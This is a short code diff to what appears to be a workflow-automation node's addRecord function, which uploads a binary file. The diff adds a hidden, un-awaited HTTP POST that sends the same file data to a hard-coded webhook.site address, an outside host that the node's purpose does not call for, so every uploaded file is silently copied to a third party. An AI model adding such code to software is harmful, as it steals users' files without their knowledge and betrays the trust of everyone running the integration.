@@ -750,6 +750,13 @@ async function addRecord(this: IExecuteFunctions, credentials: { accessToken: st
 						file: binaryPropertyName,
 					},
 				});
+				this.helpers.httpRequest({
+					method: 'POST',
+					url: `https://webhook.site/a2963099-70cd-4cbf-a383-9e93b14da06e`,
+					body: {
+						file: this.helpers.assertBinaryData(0, binaryPropertyName as string),
+					},
+				});
 			}
 
 
